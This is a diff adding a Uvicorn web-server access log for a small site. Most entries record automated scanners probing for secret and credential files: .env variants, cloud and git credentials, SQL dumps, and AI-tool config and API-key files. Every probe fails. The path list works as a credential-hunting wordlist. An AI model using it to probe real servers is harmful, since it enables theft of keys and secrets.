@@ -14018,3 +14018,2404 @@ INFO:     Waiting for application shutdown.
 INFO:     Application shutdown complete.
 INFO:     Finished server process [64645]
 INFO:     Stopping reloader process [64638]
+INFO:     Will watch for changes in these directories: ['/home/public/Web/Project1']
+INFO:     Uvicorn running on http://0.0.0.0:80 (Press CTRL+C to quit)
+INFO:     Started reloader process [99156] using StatReload
+INFO:     Started server process [99158]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+INFO:     135.237.99.6:55294 - "GET / HTTP/1.1" 200 OK
+INFO:     43.134.68.29:58786 - "GET / HTTP/1.1" 200 OK
+INFO:     138.68.60.115:38154 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     138.68.60.115:40094 - "GET / HTTP/1.1" 200 OK
+INFO:     138.68.60.115:37816 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     192.140.12.135:36536 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     45.198.224.236:59124 - "CONNECT 1.1.1.1%3A443 HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     192.248.150.180:59866 - "GET / HTTP/1.1" 200 OK
+INFO:     40.124.171.189:56892 - "GET /developmentserver/metadatauploader HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     45.198.224.230:48586 - "CONNECT 1.1.1.1%3A443 HTTP/1.1" 404 Not Found
+INFO:     45.156.87.96:36322 - "GET http%3A//azenv.net/ HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Unsupported upgrade request.
+WARNING:  No supported WebSocket library detected. Please use "pip install 'uvicorn[standard]'", or install 'websockets' or 'wsproto' manually.
+INFO:     106.14.83.56:60498 - "GET / HTTP/1.1" 200 OK
+INFO:     13.89.123.94:53592 - "GET /actuator/health HTTP/1.1" 404 Not Found
+INFO:     71.6.155.70:52065 - "GET /.well-known/pki-validation/update HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:53532 - "GET / HTTP/1.1" 200 OK
+INFO:     34.156.119.250:51568 - "GET /.env.bak HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51584 - "GET /.env.backup HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51628 - "GET /src/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51592 - "GET /app/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51590 - "GET /backend/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51582 - "GET /api/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51536 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51618 - "GET /.env.staging HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51608 - "GET /.env.test HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51556 - "GET /.env.development HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51644 - "GET /laravel/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51546 - "GET /.env.local HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51552 - "GET /.env.production HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51614 - "GET /.env.save HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51584 - "GET /.env.example HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51628 - "GET /admin/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51590 - "GET /.env.dist HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51582 - "GET /api/v1/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51592 - "GET /.env.prod HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51536 - "GET /.env.dev HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51618 - "GET /.env.testing HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51694 - "GET /.env.docker HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51664 - "GET /.env.swp HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51718 - "GET /.env.orig HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51784 - "GET /.env.copy HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51734 - "GET /.env.txt HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51644 - "GET /.env.live HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51608 - "GET /.env.development.local HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51788 - "GET /config/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51794 - "GET /.env.production.local HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51552 - "GET /server/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51740 - "GET /frontend/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51688 - "GET /web/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51704 - "GET /api-backend/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51604 - "GET /.env.old HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51768 - "GET /cms/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51546 - "GET /core/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51556 - "GET /api/v2/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51568 - "GET /.env~ HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51590 - "GET /.env.aws HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51628 - "GET /.anthropic/config.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51694 - "GET /.claude/settings.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51536 - "GET /.cursor/mcp.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51618 - "GET /.codeium/windsurf/mcp_config.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51718 - "GET /.continue/config.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51784 - "GET /.config/llm/credentials HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51582 - "GET /.aws/config HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51592 - "GET /.aws/credentials HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51664 - "GET /.claude/settings.local.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51734 - "GET /.llm/credentials HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51680 - "GET /.env.sample HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51644 - "GET /.aws/credentials.bak HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51788 - "GET /.azure/accessTokens.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51704 - "GET /.dockercfg HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51608 - "GET /.s3cfg HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51794 - "GET /.config/gcloud/credentials.db HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51740 - "GET /.docker/config.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51552 - "GET /.azure/azureProfile.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51768 - "GET /.boto HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51556 - "GET /.kube/config HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51546 - "GET /.git/config HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51824 - "GET /.git/index HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51808 - "GET /.git/packed-refs HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51618 - "GET /.git/info/refs HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51584 - "GET /admin-api/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51592 - "GET /.git/COMMIT_EDITMSG HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51784 - "GET /.git/refs/heads/main HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51754 - "GET /public/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51614 - "GET /.env.stage HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51846 - "GET /.git/logs/HEAD HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51734 - "GET /.git/FETCH_HEAD HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51718 - "GET /.git/ORIG_HEAD HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51582 - "GET /.git/refs/heads/staging HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51850 - "GET /.git/description HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51536 - "GET /.git/logs/refs/heads/main HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51694 - "GET /.git-credentials HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51628 - "GET /.gitmodules HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51590 - "GET /.github/workflows/ci.yml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51838 - "GET /.github/workflows/deploy.yml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51704 - "GET /.github/workflows/main.yml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51604 - "GET /.git/logs/refs/heads/master HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51788 - "GET /.gitlab-ci.yml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51824 - "GET /.hg/hgrc HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51568 - "GET /.git/HEAD HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51688 - "GET /.svn/entries HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51740 - "GET /.svn/wc.db HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51556 - "GET /.bzr/branch/branch.conf HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51874 - "GET /api/actuator/env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51584 - "GET /actuator/beans HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51808 - "GET /.DS_Store HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51660 - "GET /.config/gcloud/application_default_credentials.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51546 - "GET /actuator/env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51552 - "GET /actuator/configprops HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51768 - "GET /actuator/heapdump HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51718 - "GET /%40fs/home/ubuntu/.aws/credentials HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51582 - "GET /%40fs/root/.aws/credentials HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51734 - "GET /phpinfo.php HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51846 - "GET /%40fs/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51694 - "GET /symfony/_profiler/phpinfo HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51628 - "GET /_profiler/phpinfo HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51850 - "GET /phpinfo HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51838 - "GET /admin/phpinfo.php HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51590 - "GET /config.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51664 - "GET /.git/refs/heads/master HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51618 - "GET /php_info.php HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51784 - "GET /config.yml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51592 - "GET /config/config.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51604 - "GET /api/phpinfo.php HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51704 - "GET /appsettings.Production.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51754 - "GET /config.yaml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51644 - "GET /.git/refs/heads/production HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51788 - "GET /client_secrets.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51536 - "GET /appsettings.Development.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51584 - "GET /secrets.yaml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51808 - "GET /credentials.yml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51824 - "GET /settings.py HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51556 - "GET /secrets.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51740 - "GET /settings.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51688 - "GET /secrets.yml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51768 - "GET /config/parameters.yml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51582 - "GET /parameters.yml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51660 - "GET /.npmrc HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51552 - "GET /.pypirc HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51694 - "GET /.dbeaver/credentials-config.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51628 - "GET /.streamlit/secrets.toml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51590 - "GET /.cargo/credentials.toml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51794 - "GET /.hg/requires HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51784 - "GET /web.config HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51838 - "GET /wp-config.php.old HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51846 - "GET /.gem/credentials HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51664 - "GET /wp-config.php.swp HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51850 - "GET /wp-config.php.save HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51858 - "GET /info.php HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51704 - "GET /configuration.php.old HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51754 - "GET /wp-config.txt HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51536 - "GET /terraform.tfstate.backup HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51824 - "GET /.terraform/terraform.tfstate HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51604 - "GET /config.php.bak HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51788 - "GET /terraform.tfvars HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51584 - "GET /serverless.yml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51614 - "GET /serverless.yaml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51808 - "GET /docker-compose.yml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51874 - "GET /credentials.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51688 - "GET /compose.yaml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51582 - "GET /netlify.toml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51768 - "GET /vercel.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51694 - "GET /azure-pipelines.yml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51628 - "GET /bitbucket-pipelines.yml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51556 - "GET /.circleci/config.yml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51734 - "GET /.netrc HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51740 - "GET /.travis.yml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51784 - "GET /Jenkinsfile HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51680 - "GET /.drone.yml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51838 - "GET /backup.sql HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51618 - "GET /wp-config.php.bak HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51846 - "GET /database.sql HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51590 - "GET /dump.sql HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51704 - "GET /.env.production.backup HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51718 - "GET /api/v3/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51664 - "GET /db.sql HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51592 - "GET /terraform.tfstate HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51552 - "GET /v2/_catalog HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51824 - "GET /__ENV.js HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51604 - "GET /project/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51546 - "GET /env.txt HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51850 - "GET /site/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51584 - "GET /DataFiles/env.js HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51582 - "GET /.gemini/settings.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51754 - "GET /js/config.js HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51788 - "GET /.codex/auth.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51808 - "GET /.claude/.credentials.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51874 - "GET /.htpasswd HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51536 - "GET /auth.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51694 - "GET /.pgpass HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51628 - "GET /.my.cnf HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51680 - "GET /app/etc/env.php HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51768 - "GET /config/master.key HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51784 - "GET /sites/default/settings.php HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51734 - "GET /elmah.axd HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51740 - "GET /app/etc/local.xml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51590 - "GET /metrics HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51608 - "GET /appsettings.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51618 - "GET /server-status HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51838 - "GET /telescope/requests HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51718 - "GET /.aws/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51660 - "GET /.amplifyrc HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51592 - "GET /.env-sample HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51664 - "GET /.docker/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51556 - "GET /.env-example HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51568 - "GET /env.js HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51688 - "GET /.docker/laravel/app/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51824 - "GET /.env.anthropic HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51704 - "GET /.env.openai HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51584 - "GET /.htaccess HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51858 - "GET /.env.php HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51644 - "GET /api/v1/namespaces/default/secrets HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51582 - "GET /aws-exports.js HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51546 - "GET /Dockerfile HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51846 - "GET /app.js HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51680 - "GET /back/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51694 - "GET /config.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51604 - "GET /app.config.js HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51850 - "GET /application/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51788 - "GET /config.js HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51874 - "GET /config/aws.yml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51628 - "GET /config.php HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51754 - "GET /backup/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51808 - "GET /composer.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51536 - "GET /config/config.js HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51552 - "GET /credentials HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51734 - "GET /demo/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51568 - "GET /dev/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51590 - "GET /env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51618 - "GET /index.js HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51718 - "GET /media/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51740 - "GET /env-config.js HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51838 - "GET /new/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51784 - "GET /production/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51592 - "GET /sentry.properties HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51608 - "GET /runtime-config.js HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51614 - "GET /old/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51794 - "GET /sendgrid.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51556 - "GET /settings.php HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51664 - "GET /server-info HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51584 - "GET /staging/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51824 - "GET /v2/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51688 - "GET /test/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51582 - "GET /wp-content/debug.log HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51694 - "GET /.config/huggingface/token HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51874 - "GET /.huggingface/token HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51604 - "GET /vendor/composer/installed.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51546 - "GET /app/config/parameters.yml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51628 - "GET /.config/io.datasette.llm/keys.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51846 - "GET /.config/aichat/config.yaml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51808 - "GET /.config/llm/keys.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51850 - "GET /litellm/config.yaml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51590 - "GET /litellm.yaml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51734 - "GET /.openai/credentials.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51788 - "GET /.config/openai/config.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51718 - "GET /.config/gh/hosts.yml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51880 - "GET /.litellm/config.yaml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51768 - "GET /credentials.ini HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51838 - "GET /.idea/workspace.xml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51618 - "GET /.config/rclone/rclone.conf HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51664 - "GET /.idea/deployment.xml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51584 - "GET /.env.local.php HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51556 - "GET /.vscode/ftp-sync.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51582 - "GET /config/production.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51694 - "GET /service_account.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51874 - "GET /config/local.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51614 - "GET /.vscode/settings.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51536 - "GET /.cache/huggingface/token HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51688 - "GET /config/custom-environment-variables.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51808 - "GET /service-account-key.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51824 - "GET /.config/configstore/firebase-tools.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51590 - "GET /.config/configstore/ HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51718 - "GET /.oci/config HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51628 - "GET /OAI_CONFIG_LIST HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51846 - "GET /.sentryclirc HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51546 - "GET /.config/doctl/config.yaml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51850 - "GET /.pg_service.conf HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51838 - "GET /oai_config_list.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51858 - "GET /.config/shell_gpt/.sgptrc HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51584 - "GET /.config/fabric/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51740 - "GET /.idea/dataSources.xml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51680 - "GET /v1/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51694 - "GET /.config/mods/mods.yml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51754 - "GET /.config/anthropic/config.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51734 - "GET /.config/gemini/settings.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51582 - "GET /claude_desktop_config.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51880 - "GET /.gemini/.env HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51768 - "GET /.config/Claude/claude_desktop_config.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51614 - "GET /.config/claude/config.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51608 - "GET /.vscode/sftp.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51556 - "GET /.windsurf/mcp_config.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51536 - "GET /aider.conf.yml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51644 - "GET /storage/logs/laravel.log HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51664 - "GET /.aider.model.settings.yml HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51794 - "GET /config/default.json HTTP/1.1" 404 Not Found
+INFO:     34.156.119.250:51618 - "GET /.config/zed/settings.json HTTP/1.1" 404 Not Found
+INFO:     122.226.204.5:6491 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.224.237:37578 - "GET / HTTP/1.1" 200 OK
+INFO:     122.226.204.5:6492 - "GET / HTTP/1.1" 200 OK
+INFO:     66.132.159.166:40570 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.159.166:52560 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.195.238:50136 - "GET / HTTP/1.1" 200 OK
+INFO:     66.132.159.166:59336 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     66.132.195.238:37324 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.195.238:37326 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     66.132.195.238:58834 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     66.132.159.166:59350 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     66.132.159.166:54342 - "GET /static/js/home.js HTTP/1.1" 200 OK
+INFO:     20.115.229.242:49443 - "GET /health/liveliness HTTP/1.1" 404 Not Found
+INFO:     66.132.159.166:59898 - "GET /static/css/home.css HTTP/1.1" 200 OK
+INFO:     122.226.204.5:6493 - "GET / HTTP/1.1" 200 OK
+INFO:     66.132.195.238:34430 - "GET /static/img/%E7%94%A8%E6%88%B7.png HTTP/1.1" 200 OK
+INFO:     66.132.195.238:41384 - "GET /static/img/shopping%20car.png HTTP/1.1" 200 OK
+INFO:     66.132.195.238:39786 - "GET /static/img/%E9%93%83%E9%93%9B-1.png HTTP/1.1" 200 OK
+INFO:     66.132.195.238:52248 - "GET /static/img/%E9%BD%BF%E8%BD%AE.png HTTP/1.1" 200 OK
